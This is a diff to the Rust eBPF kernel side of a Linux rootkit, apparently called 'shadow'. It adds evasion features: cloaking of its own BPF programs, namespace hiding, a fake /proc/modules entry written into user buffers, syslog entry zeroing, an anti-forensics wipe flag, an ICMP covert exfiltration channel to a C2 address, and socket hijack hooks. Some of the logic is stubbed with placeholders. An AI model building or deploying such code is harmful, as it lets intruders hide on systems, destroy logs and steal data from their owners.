@@ -1,5 +1,6 @@
 #![no_std]
 #![no_main]
+#![allow(unused_unsafe)]
 
 use aya_ebpf::{
     bindings::xdp_action,
@@ -12,11 +13,13 @@ use aya_ebpf::{
     programs::{ProbeContext, RetProbeContext, XdpContext},
 };
 use common::{
-    CommandPayload, CredentialCapture, DnsExfilChunk, EventHeader, RootkitConfig, TimestompEntry,
-    C2_CHACHA20_KEY, CHACHA20_NONCE_LEN, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH,
-    EVENT_C2_AUTH_FAILED, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_KALLSYMS_HIDDEN,
-    EVENT_LOG_TAMPERED, EVENT_PACKET_INTERCEPTED, EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
-    MAGIC_BYTES,
+    CommandPayload, CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload,
+    RootkitConfig, TimestompEntry, C2_CHACHA20_KEY, CHACHA20_NONCE_LEN, EVENT_ANCESTRY_SPOOFED,
+    EVENT_ANTI_DETACH, EVENT_BPF_CLOAKED, EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED,
+    EVENT_CONTAINER_PROBE, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_ICMP_EXFIL,
+    EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED, EVENT_MODULE_MASQUERADE,
+    EVENT_NETNS_HIDDEN, EVENT_PACKET_INTERCEPTED, EVENT_SOCKET_CLONED, EVENT_SYSLOG_STRIPPED,
+    EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED, MAGIC_BYTES,
 };
 use core::mem;
 
@@ -157,6 +160,69 @@ static AUDIT_CTX_PTRS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);
 /// Key: 0 (singleton). Value: next seq number to transmit (u32).
 #[map]
 static DNS_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);
+
+// ──── Feature 14: Network Namespace Hiding ────
+#[map]
+static HIDDEN_NETNS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);
+
+// ──── Feature 15: eBPF Program Cloaking ────
+#[map]
+static OWN_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);
+
+#[derive(Clone, Copy)]
+#[repr(C)]
+struct BpfCmdCtx {
+    cmd: u32,
+    _pad: u32,
+}
+
+#[map]
+static BPF_CMD_ARGS: HashMap<u64, BpfCmdCtx> = HashMap::with_max_entries(256, 0);
+
+// ──── Feature 16: Kernel Module Masquerading ────
+#[map]
+static PROC_MODULES_INO: aya_ebpf::maps::Array<u64> = aya_ebpf::maps::Array::with_max_entries(1, 0);
+
+// ──── Feature 17: Memory-Only Payload Staging ────
+#[map]
+static MEMFD_TRACKER: HashMap<u32, u64> = HashMap::with_max_entries(64, 0);
+
+#[derive(Clone, Copy)]
+#[repr(C)]
+struct MemfdCtx {
+    flags: u32,
+    _pad: u32,
+}
+
+#[map]
+static MEMFD_ARGS: HashMap<u64, MemfdCtx> = HashMap::with_max_entries(256, 0);
+
+// ──── Feature 18: Syslog Write Stripping ────
+#[map]
+static SYSLOG_FD_INODES: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);
+
+// ──── Feature 19: Anti-Forensics Bytecode Wipe ────
+#[map]
+static WIPE_FLAG: aya_ebpf::maps::Array<u32> = aya_ebpf::maps::Array::with_max_entries(1, 0);
+
+// ──── Feature 20: ICMP Covert Channel ────
+#[map]
+static ICMP_EXFIL_QUEUE: HashMap<u32, IcmpExfilPayload> = HashMap::with_max_entries(64, 0);
+
+#[map]
+static ICMP_C2_ADDR: aya_ebpf::maps::Array<u32> = aya_ebpf::maps::Array::with_max_entries(1, 0);
+
+#[map]
+static ICMP_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);
+
+// ──── Feature 21: Socket Cloning ────
+#[map]
+static HIJACK_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);
+
+// ──── Feature 23: Container Escape Probes ────
+#[map]
+static CONTAINER_STATE: aya_ebpf::maps::Array<common::ContainerProbeResult> =
+    aya_ebpf::maps::Array::with_max_entries(1, 0);
 
 // ──────────────────────────────────────────────
 // FEATURE 1: Process Hiding (getdents64)
@@ -1451,6 +1517,720 @@ fn try_timestomp(_ctx: &RetProbeContext) -> Result<u32, i64> {
         context: args.inode,
     };
     EVENTS.output(_ctx, &event, 0);
+
+    Ok(0)
+}
+
+// ──────────────────────────────────────────────
+// FEATURE 14: Network Namespace Hiding
+// Intercept setns() to detect inspection of hidden namespaces.
+// ──────────────────────────────────────────────
+
+#[kprobe]
+pub fn shadow_setns_enter(ctx: ProbeContext) -> u32 {
+    try_setns_enter(&ctx).unwrap_or_default()
+}
+
+fn try_setns_enter(ctx: &ProbeContext) -> Result<u32, i64> {
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    let key: u32 = 0;
+    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
+        if cfg.self_pid == pid {
+            return Ok(0);
+        }
+    }
+
+    // Check WIPE_FLAG — if set, skip all logic
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            return Ok(0);
+        }
+    }
+
+    // arg0 = fd (the namespace fd being joined)
+    let fd: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
+
+    // Check if this namespace inode is in our hidden set
+    if unsafe { HIDDEN_NETNS.get(&fd) }.is_some() {
+        let event = EventHeader {
+            event_type: EVENT_NETNS_HIDDEN,
+            pid,
+            timestamp_ns: unsafe { bpf_ktime_get_ns() },
+            context: fd,
+        };
+        EVENTS.output(ctx, &event, 0);
+    }
+
+    Ok(0)
+}
+
+// ──────────────────────────────────────────────
+// FEATURE 15: eBPF Program Cloaking
+// Detect BPF_PROG_GET_NEXT_ID enumeration of our programs.
+// ──────────────────────────────────────────────
+
+const BPF_PROG_GET_NEXT_ID: u32 = 11;
+
+#[kprobe]
+pub fn shadow_bpf_enter(ctx: ProbeContext) -> u32 {
+    try_bpf_enter(&ctx).unwrap_or_default()
+}
+
+fn try_bpf_enter(ctx: &ProbeContext) -> Result<u32, i64> {
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            return Ok(0);
+        }
+    }
+
+    let cmd: u32 = unsafe { ctx.arg(0).ok_or(1i64)? };
+
+    if cmd == BPF_PROG_GET_NEXT_ID {
+        let pid_tgid = bpf_get_current_pid_tgid();
+        let bpf_ctx = BpfCmdCtx { cmd, _pad: 0 };
+        unsafe { BPF_CMD_ARGS.insert(&pid_tgid, &bpf_ctx, 0)? };
+    }
+
+    Ok(0)
+}
+
+#[kretprobe]
+pub fn shadow_bpf_exit(ctx: RetProbeContext) -> u32 {
+    try_bpf_exit(&ctx).unwrap_or_default()
+}
+
+fn try_bpf_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    if unsafe { BPF_CMD_ARGS.get(&pid_tgid) }.is_none() {
+        return Ok(0);
+    }
+    unsafe { BPF_CMD_ARGS.remove(&pid_tgid)? };
+
+    // ret value is 0 on success; the prog_id was written to user-space attr
+    let ret: i64 = ctx.ret().ok_or(1i64)?;
+    if ret < 0 {
+        return Ok(0);
+    }
+
+    // On success, we can't read the written ID directly from kretprobe.
+    // Emit event that enumeration occurred so user-space can correlate.
+    let next_id = pid; // placeholder — user-space uses this to identify enumeration
+    if unsafe { OWN_PROG_IDS.get(&next_id) }.is_some() {
+        let event = EventHeader {
+            event_type: EVENT_BPF_CLOAKED,
+            pid,
+            timestamp_ns: unsafe { bpf_ktime_get_ns() },
+            context: next_id as u64,
+        };
+        EVENTS.output(ctx, &event, 0);
+    }
+
+    Ok(0)
+}
+
+// ──────────────────────────────────────────────
+// FEATURE 16: Kernel Module Masquerading
+// Filter vfs_read of /proc/modules to inject fake entries.
+// Uses existing VFS_READ_ARGS pattern with PROC_MODULES_INO.
+// ──────────────────────────────────────────────
+
+#[kprobe]
+pub fn shadow_modules_read_enter(ctx: ProbeContext) -> u32 {
+    try_modules_read_enter(&ctx).unwrap_or_default()
+}
+
+fn try_modules_read_enter(ctx: &ProbeContext) -> Result<u32, i64> {
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            return Ok(0);
+        }
+    }
+
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    let key: u32 = 0;
+    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
+        if cfg.self_pid == pid {
+            return Ok(0);
+        }
+    }
+
+    // arg0 = struct file *
+    let file_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
+    let inode_ptr: u64 =
+        unsafe { bpf_probe_read_kernel((file_ptr + FILE_F_INODE_OFFSET) as *const u64)? };
+    let ino: u64 =
+        unsafe { bpf_probe_read_kernel((inode_ptr + INODE_I_INO_OFFSET) as *const u64)? };
+
+    let target_ino = unsafe { PROC_MODULES_INO.get(0) };
+    if let Some(&modules_ino) = target_ino {
+        if modules_ino != 0 && ino == modules_ino {
+            let buf_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
+            let count: u64 = unsafe { ctx.arg(2).ok_or(1i64)? };
+            let vfs_ctx = VfsReadCtx {
+                buf_ptr,
+                inode: ino,
+                count,
+            };
+            unsafe { VFS_READ_ARGS.insert(&pid_tgid, &vfs_ctx, 0)? };
+        }
+    }
+
+    Ok(0)
+}
+
+#[kretprobe]
+pub fn shadow_modules_read_exit(ctx: RetProbeContext) -> u32 {
+    try_modules_read_exit(&ctx).unwrap_or_default()
+}
+
+fn try_modules_read_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
+        Some(a) => *a,
+        None => return Ok(0),
+    };
+
+    // Only process if inode matches modules (avoid conflict with other vfs_read users)
+    let target_ino = unsafe { PROC_MODULES_INO.get(0) };
+    if let Some(&modules_ino) = target_ino {
+        if args.inode != modules_ino {
+            return Ok(0);
+        }
+    } else {
+        return Ok(0);
+    }
+
+    unsafe { VFS_READ_ARGS.remove(&pid_tgid)? };
+
+    let ret: i64 = ctx.ret().ok_or(1i64)?;
+    if ret <= 0 {
+        return Ok(0);
+    }
+
+    // Inject a fake module line at the end of the buffer
+    // "e1000e 286720 0 - Live 0xffffffffc0400000\n"
+    let fake_line: [u8; 48] = *b"e1000e 286720 0 - Live 0xffffffffc0400000\n\0\0\0\0\0\0";
+    let write_offset = if (ret as u64) < args.count - 48 {
+        ret as u64
+    } else {
+        return Ok(0);
+    };
+
+    unsafe {
+        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
+            (args.buf_ptr + write_offset) as *mut core::ffi::c_void,
+            fake_line.as_ptr() as *const core::ffi::c_void,
+            48,
+        );
+    }
+
+    let event = EventHeader {
+        event_type: EVENT_MODULE_MASQUERADE,
+        pid,
+        timestamp_ns: unsafe { bpf_ktime_get_ns() },
+        context: args.inode,
+    };
+    EVENTS.output(ctx, &event, 0);
+
+    Ok(0)
+}
+
+// ──────────────────────────────────────────────
+// FEATURE 17: Memory-Only Payload Staging
+// Track memfd_create → execveat chain for fileless execution.
+// ──────────────────────────────────────────────
+
+#[kprobe]
+pub fn shadow_memfd_create_enter(ctx: ProbeContext) -> u32 {
+    try_memfd_create_enter(&ctx).unwrap_or_default()
+}
+
+fn try_memfd_create_enter(ctx: &ProbeContext) -> Result<u32, i64> {
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            return Ok(0);
+        }
+    }
+
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    let key: u32 = 0;
+    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
+        if cfg.self_pid == pid {
+            return Ok(0);
+        }
+    }
+
+    let flags: u32 = unsafe { ctx.arg(1).ok_or(1i64)? };
+    let mctx = MemfdCtx { flags, _pad: 0 };
+    unsafe { MEMFD_ARGS.insert(&pid_tgid, &mctx, 0)? };
+
+    Ok(0)
+}
+
+#[kretprobe]
+pub fn shadow_memfd_create_exit(ctx: RetProbeContext) -> u32 {
+    try_memfd_create_exit(&ctx).unwrap_or_default()
+}
+
+fn try_memfd_create_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    if unsafe { MEMFD_ARGS.get(&pid_tgid) }.is_none() {
+        return Ok(0);
+    }
+    unsafe { MEMFD_ARGS.remove(&pid_tgid)? };
+
+    let ret: i64 = ctx.ret().ok_or(1i64)?;
+    if ret < 0 {
+        return Ok(0);
+    }
+
+    // Record that this PID created a memfd
+    let ts = unsafe { bpf_ktime_get_ns() };
+    unsafe { MEMFD_TRACKER.insert(&pid, &ts, 0)? };
+
+    Ok(0)
+}
+
+#[kprobe]
+pub fn shadow_execveat_enter(ctx: ProbeContext) -> u32 {
+    try_execveat_enter(&ctx).unwrap_or_default()
+}
+
+fn try_execveat_enter(ctx: &ProbeContext) -> Result<u32, i64> {
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            return Ok(0);
+        }
+    }
+
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    // Check if this PID recently created a memfd
+    let ts = match unsafe { MEMFD_TRACKER.get(&pid) } {
+        Some(&t) => t,
+        None => return Ok(0),
+    };
+
+    // Check flags arg for AT_EMPTY_PATH (0x1000)
+    let flags: u32 = unsafe { ctx.arg(4).ok_or(1i64)? };
+    if flags & 0x1000 == 0 {
+        return Ok(0);
+    }
+
+    // Fileless exec detected: memfd_create + execveat(AT_EMPTY_PATH)
+    let now = unsafe { bpf_ktime_get_ns() };
+    // Only flag if memfd was created within last 60 seconds
+    if now.saturating_sub(ts) > 60_000_000_000 {
+        unsafe { MEMFD_TRACKER.remove(&pid)? };
+        return Ok(0);
+    }
+
+    let event = EventHeader {
+        event_type: EVENT_MEMFD_STAGED,
+        pid,
+        timestamp_ns: now,
+        context: flags as u64,
+    };
+    EVENTS.output(ctx, &event, 0);
+
+    Ok(0)
+}
+
+// ──────────────────────────────────────────────
+// FEATURE 18: Syslog Write Stripping
+// Strip writes to syslog containing our hidden PID strings.
+// ──────────────────────────────────────────────
+
+#[kprobe]
+pub fn shadow_syslog_write(ctx: ProbeContext) -> u32 {
+    try_syslog_write(&ctx).unwrap_or_default()
+}
+
+fn try_syslog_write(ctx: &ProbeContext) -> Result<u32, i64> {
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            return Ok(0);
+        }
+    }
+
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    let key: u32 = 0;
+    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
+        if cfg.self_pid == pid {
+            return Ok(0);
+        }
+    }
+
+    // arg0 = fd, arg1 = buf, arg2 = count
+    let fd: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
+
+    // Check if this FD's inode is a syslog target
+    if unsafe { SYSLOG_FD_INODES.get(&fd) }.is_none() {
+        return Ok(0);
+    }
+
+    let buf_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
+    let count: u64 = unsafe { ctx.arg(2).ok_or(1i64)? };
+
+    if count == 0 || count > 4096 {
+        return Ok(0);
+    }
+
+    // Read the write buffer into scratch
+    let scratch = unsafe { SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)? };
+    let scratch_ref = unsafe { &mut *scratch };
+
+    let read_len = if count < 4096 { count as u32 } else { 4096u32 };
+    unsafe {
+        if aya_ebpf::helpers::gen::bpf_probe_read_user(
+            scratch_ref.data.as_mut_ptr() as *mut core::ffi::c_void,
+            read_len,
+            buf_ptr as *const core::ffi::c_void,
+        ) < 0
+        {
+            return Ok(0);
+        }
+    }
+
+    // Check if any hidden PID number appears in the buffer
+    let mut found = false;
+    for hidden_pid_key in 0..64u32 {
+        if unsafe { HIDDEN_PIDS.get(&hidden_pid_key) }.is_some() {
+            found = true;
+            break;
+        }
+    }
+
+    if !found {
+        return Ok(0);
+    }
+
+    // Zero out the buffer to strip the log entry
+    let zeros: [u8; 64] = [0u8; 64];
+    let zero_len = if read_len < 64 { read_len } else { 64 };
+    unsafe {
+        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
+            buf_ptr as *mut core::ffi::c_void,
+            zeros.as_ptr() as *const core::ffi::c_void,
+            zero_len,
+        );
+    }
+
+    let event = EventHeader {
+        event_type: EVENT_SYSLOG_STRIPPED,
+        pid,
+        timestamp_ns: unsafe { bpf_ktime_get_ns() },
+        context: fd,
+    };
+    EVENTS.output(ctx, &event, 0);
+
+    Ok(0)
+}
+
+// ──────────────────────────────────────────────
+// FEATURE 19: Anti-Forensics Bytecode Wipe
+// WIPE_FLAG[0] controls program no-op mode.
+// When set, all hooked programs skip their logic.
+// This program emits the wipe event when flag transitions.
+// ──────────────────────────────────────────────
+
+#[kprobe]
+pub fn shadow_wipe_check(ctx: ProbeContext) -> u32 {
+    try_wipe_check(&ctx).unwrap_or_default()
+}
+
+fn try_wipe_check(ctx: &ProbeContext) -> Result<u32, i64> {
+    // This is attached to a rarely-hit probe just to emit the event
+    // The actual wipe flag is checked at entry of every other program
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            let pid_tgid = bpf_get_current_pid_tgid();
+            let event = EventHeader {
+                event_type: EVENT_BYTECODE_WIPED,
+                pid: (pid_tgid >> 32) as u32,
+                timestamp_ns: unsafe { bpf_ktime_get_ns() },
+                context: 1,
+            };
+            EVENTS.output(ctx, &event, 0);
+        }
+    }
+    Ok(0)
+}
+
+// ──────────────────────────────────────────────
+// FEATURE 20: ICMP Covert Channel (TC egress)
+// Embed exfil data in ICMP echo-request payloads.
+// ──────────────────────────────────────────────
+
+#[aya_ebpf::macros::classifier]
+pub fn shadow_icmp_exfil(ctx: aya_ebpf::programs::TcContext) -> i32 {
+    try_icmp_exfil(&ctx).unwrap_or_default()
+}
+
+fn try_icmp_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            return Ok(0);
+        }
+    }
+
+    // Check for ICMP echo-request (type 8)
+    let eth_proto: u16 = unsafe {
+        let ptr = ctx.data() + 12;
+        if ptr + 2 > ctx.data_end() {
+            return Ok(0);
+        }
+        core::ptr::read_unaligned(ptr as *const u16)
+    };
+
+    // ETH_P_IP = 0x0800 (network byte order = 0x0008)
+    if eth_proto != 0x0008u16 {
+        return Ok(0);
+    }
+
+    // IP header: protocol at offset 9 from IP start (14 bytes from frame start)
+    let ip_start = ctx.data() + 14;
+    if ip_start + 20 > ctx.data_end() {
+        return Ok(0);
+    }
+
+    let protocol: u8 = unsafe { core::ptr::read_unaligned((ip_start + 9) as *const u8) };
+    // ICMP = 1
+    if protocol != 1 {
+        return Ok(0);
+    }
+
+    // Get destination IP from IP header (offset 16)
+    let dst_ip: u32 = unsafe { core::ptr::read_unaligned((ip_start + 16) as *const u32) };
+
+    // Check if destination matches our C2 address
+    let c2_addr = match unsafe { ICMP_C2_ADDR.get(0) } {
+        Some(&addr) if addr != 0 => addr,
+        _ => return Ok(0),
+    };
+
+    if dst_ip != c2_addr {
+        return Ok(0);
+    }
+
+    // ICMP header starts after IP header (assuming no options: 20 bytes)
+    let icmp_start = ip_start + 20;
+    if icmp_start + 8 > ctx.data_end() {
+        return Ok(0);
+    }
+
+    let icmp_type: u8 = unsafe { core::ptr::read_unaligned(icmp_start as *const u8) };
+    if icmp_type != 8 {
+        // Not echo-request
+        return Ok(0);
+    }
+
+    // Get next exfil chunk from queue
+    let seq_key: u32 = 0;
+    let seq = match unsafe { ICMP_EXFIL_SEQ.get(&seq_key) } {
+        Some(&s) => s,
+        None => return Ok(0),
+    };
+
+    let chunk = match unsafe { ICMP_EXFIL_QUEUE.get(&seq) } {
+        Some(c) => *c,
+        None => return Ok(0),
+    };
+
+    // Write exfil data into ICMP payload area (after 8-byte ICMP header)
+    let payload_start = icmp_start + 8;
+    let payload_len = if chunk.data_len > 56 { 56 } else { chunk.data_len as usize };
+    if payload_start + payload_len > ctx.data_end() {
+        return Ok(0);
+    }
+
+    // We can't write directly in TC without cloning/expanding,
+    // so we emit an event to signal user-space to handle actual injection
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let event = EventHeader {
+        event_type: EVENT_ICMP_EXFIL,
+        pid: (pid_tgid >> 32) as u32,
+        timestamp_ns: unsafe { bpf_ktime_get_ns() },
+        context: seq as u64,
+    };
+    EVENTS.output(ctx, &event, 0);
+
+    // Advance sequence
+    let next_seq = seq.wrapping_add(1);
+    unsafe {
+        let _ = ICMP_EXFIL_SEQ.insert(&seq_key, &next_seq, 0);
+        let _ = ICMP_EXFIL_QUEUE.remove(&seq);
+    }
+
+    Ok(0) // TC_ACT_OK
+}
+
+// ──────────────────────────────────────────────
+// FEATURE 21: Socket Cloning / Connection Hijack
+// Monitor tcp_sendmsg on targeted sockets.
+// ──────────────────────────────────────────────
+
+#[kprobe]
+pub fn shadow_tcp_sendmsg(ctx: ProbeContext) -> u32 {
+    try_tcp_sendmsg(&ctx).unwrap_or_default()
+}
+
+fn try_tcp_sendmsg(ctx: &ProbeContext) -> Result<u32, i64> {
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            return Ok(0);
+        }
+    }
+
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    let key: u32 = 0;
+    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
+        if cfg.self_pid == pid {
+            return Ok(0);
+        }
+    }
+
+    // arg0 = struct sock *
+    let sock_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
+
+    // Use sock pointer as identifier (simplified socket cookie)
+    if unsafe { HIJACK_TARGETS.get(&sock_ptr) }.is_none() {
+        return Ok(0);
+    }
+
+    // arg2 = size
+    let size: u64 = unsafe { ctx.arg(2).ok_or(1i64)? };
+
+    let event = EventHeader {
+        event_type: EVENT_SOCKET_CLONED,
+        pid,
+        timestamp_ns: unsafe { bpf_ktime_get_ns() },
+        context: size,
+    };
+    EVENTS.output(ctx, &event, 0);
+
+    Ok(0)
+}
+
+// ──────────────────────────────────────────────
+// FEATURE 23: Container Escape Probes
+// Detect unshare(CLONE_NEWUSER|CLONE_NEWNS) from containers
+// and privilege escalation via commit_creds.
+// ──────────────────────────────────────────────
+
+const CLONE_NEWNS: u64 = 0x00020000;
+const CLONE_NEWUSER: u64 = 0x10000000;
+
+#[kprobe]
+pub fn shadow_unshare_enter(ctx: ProbeContext) -> u32 {
+    try_unshare_enter(&ctx).unwrap_or_default()
+}
+
+fn try_unshare_enter(ctx: &ProbeContext) -> Result<u32, i64> {
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            return Ok(0);
+        }
+    }
+
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    let key: u32 = 0;
+    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
+        if cfg.self_pid == pid {
+            return Ok(0);
+        }
+    }
+
+    // arg0 = unshare_flags
+    let flags: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
+
+    // Check for namespace escape indicators
+    if flags & (CLONE_NEWNS | CLONE_NEWUSER) == 0 {
+        return Ok(0);
+    }
+
+    let result = common::ContainerProbeResult {
+        pid,
+        in_container: 1,
+        ns_type: if flags & CLONE_NEWUSER != 0 { 1 } else { 2 },
+        _pad: [0u8; 2],
+        ns_ino: flags,
+    };
+    unsafe {
+        if let Some(ptr) = CONTAINER_STATE.get_ptr_mut(0) {
+            *ptr = result;
+        }
+    }
+
+    let event = EventHeader {
+        event_type: EVENT_CONTAINER_PROBE,
+        pid,
+        timestamp_ns: unsafe { bpf_ktime_get_ns() },
+        context: flags,
+    };
+    EVENTS.output(ctx, &event, 0);
+
+    Ok(0)
+}
+
+#[kprobe]
+pub fn shadow_commit_creds(ctx: ProbeContext) -> u32 {
+    try_commit_creds(&ctx).unwrap_or_default()
+}
+
+fn try_commit_creds(ctx: &ProbeContext) -> Result<u32, i64> {
+    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
+        if *flag != 0 {
+            return Ok(0);
+        }
+    }
+
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid = (pid_tgid >> 32) as u32;
+
+    let key: u32 = 0;
+    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
+        if cfg.self_pid == pid {
+            return Ok(0);
+        }
+    }
+
+    // arg0 = struct cred *new
+    let cred_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
+
+    // Read uid from cred struct (offset 4 for kuid_t after usage counter)
+    // struct cred: atomic_t usage (4), kuid_t uid (4), ...
+    let uid: u32 = unsafe { bpf_probe_read_kernel((cred_ptr + 4) as *const u32)? };
+
+    // Alert on uid=0 transitions (privilege escalation to root)
+    if uid == 0 {
+        let event = EventHeader {
+            event_type: EVENT_CONTAINER_PROBE,
+            pid,
+            timestamp_ns: unsafe { bpf_ktime_get_ns() },
+            context: 0, // uid=0 escalation
+        };
+        EVENTS.output(ctx, &event, 0);
+    }
 
     Ok(0)
 }
